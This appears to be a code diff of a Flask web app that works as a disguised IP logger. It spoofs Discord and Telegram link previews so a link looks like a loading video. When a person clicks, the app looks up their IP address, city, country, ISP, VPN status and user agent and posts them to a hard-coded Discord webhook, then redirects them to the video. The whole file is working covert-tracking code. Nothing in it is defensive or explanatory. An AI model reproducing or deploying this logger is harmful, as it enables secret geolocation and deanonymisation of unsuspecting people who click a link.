@@ -1,78 +1,74 @@
 import os
 import requests
-from flask import Flask, request, redirect, send_file, render_template_string
-import io
+from flask import Flask, request, redirect, render_template_string
+import time
 from datetime import datetime
 
 app = Flask(__name__)
 
+# YOUR CONFIG
 WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"
-GIF_URL = "https://media1.tenor.com/m/EGAPcaiphUoAAAAC/loading-screen-two-dots.gif"
+# The MP4 version of your loading dots
+MP4_URL = "https://media.tenor.com/m/EGAPcaiphUoAAAAP/loading-screen-two-dots.mp4" 
 
-@app.route('/view/image_01.png')
-def logger():
+@app.route('/v/<id>')
+def interceptor(id):
     ua = request.user_agent.string
     ua_low = ua.lower()
     
-    # 1. THE DISCORD PREVIEW BOOSTER
-    # This tells Discord to show the GIF inside the chat app
-    if any(x in ua_low for x in ["discord", "telegram", "bot", "slack"]):
+    # 1. DISCORD SPOOF (Forcing the Video Player)
+    if any(x in ua_low for x in ["discord", "telegram", "bot"]):
         html = f'''
         <html>
             <head>
+                <meta property="og:title" content="Loading Media...">
                 <meta property="og:type" content="video.other">
-                <meta property="og:image" content="{GIF_URL}">
-                <meta property="twitter:card" content="summary_large_image">
-                <meta property="twitter:image" content="{GIF_URL}">
-                <meta http-equiv="refresh" content="0;url={GIF_URL}">
+                <meta property="og:video" content="{MP4_URL}">
+                <meta property="og:video:type" content="video/mp4">
+                <meta property="og:video:width" content="640">
+                <meta property="og:video:height" content="640">
+                <meta name="twitter:card" content="player">
+                <meta name="twitter:player" content="{MP4_URL}">
             </head>
-            <body></body>
+            <body style="background-color:black;"></body>
         </html>
         '''
         return render_template_string(html)
 
-    # 2. CORE DATA COLLECTION (The Logger)
+    # 2. THE DEEP SCAN (IP, Geo, Device)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    ref = request.referrer or "System Default/Private"
-    lang = request.accept_languages.best or "Unknown"
     time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")
-
-    # Geolocation Lookup
-    c, r, cntry, isp, org, asn, mob, vpn, host, tz = "??","??","??","??","??","??","??","??","??","??"
+    
+    c, r, cntry, isp, vpn = "??","??","??","??","??"
     try:
         g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
         if g['status'] == 'success':
-            c, r, cntry, isp, org, asn, tz = g.get('city'), g.get('regionName'), g.get('country'), g.get('isp'), g.get('org'), g.get('as'), g.get('timezone')
-            mob = "📱 Mobile" if g.get('mobile') else "💻 Desktop/WiFi"
-            vpn = "🚨 DETECTED" if g.get('proxy') else "✅ Clean"
-            host = "⚠️ DATA CENTER" if g.get('hosting') else "🏠 RESIDENTIAL"
+            c, r, cntry = g.get('city'), g.get('regionName'), g.get('country')
+            isp, vpn = g.get('isp'), "🚨 YES" if g.get('proxy') else "✅ NO"
     except: pass
 
-    # 3. WEBHOOK PAYLOAD
+    # 3. WEBHOOK REPORT
     payload = {
-        "username": "OMEGA-CORE INTERCEPT",
-        "avatar_url": "https://i.imgur.com/8N76f9J.png",
+        "username": "VIDEO SENSOR",
         "embeds": [{
-            "title": "⚡ TARGET INTERCEPTED",
-            "description": f"**Ref:** `{ref}` | **Time:** `{time_utc}`",
-            "color": 0x000000,
+            "title": "🎬 VIDEO CLICK DETECTED",
+            "color": 0x00FF00,
             "fields": [
-                {"name": "📍 LOCATION", "value": f"```City: {c}\nCountry: {cntry}\nTZ: {tz}```", "inline": False},
-                {"name": "🌐 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}\n**Type:** {host}", "inline": False},
-                {"name": "🧬 DEVICE", "value": f"**Type:** {mob}\n**IP:** `{ip}`", "inline": True},
-                {"name": "📄 RAW UA", "value": f"```{ua}```", "inline": False}
+                {"name": "📍 GEOLOCATION", "value": f"```City: {c}\nCountry: {cntry}```", "inline": True},
+                {"name": "🌐 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}", "inline": True},
+                {"name": "🧬 DEVICE", "value": f"**IP:** `{ip}`\n**UA:** `{ua}`", "inline": False}
             ],
-            "footer": {"text": "Alpha v7.0 | Animation Active"}
+            "footer": {"text": f"Captured at {time_utc}"}
         }]
     }
     
+    # 4. EXECUTION
     try:
         requests.post(WEBHOOK_URL, json=payload, timeout=10)
-    except:
-        pass
+        time.sleep(1.2) # Delay to ensure data capture before browser moves
+    except: pass
 
-    # 4. FINAL REDIRECT
-    return redirect(GIF_URL)
+    return redirect(MP4_URL)
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
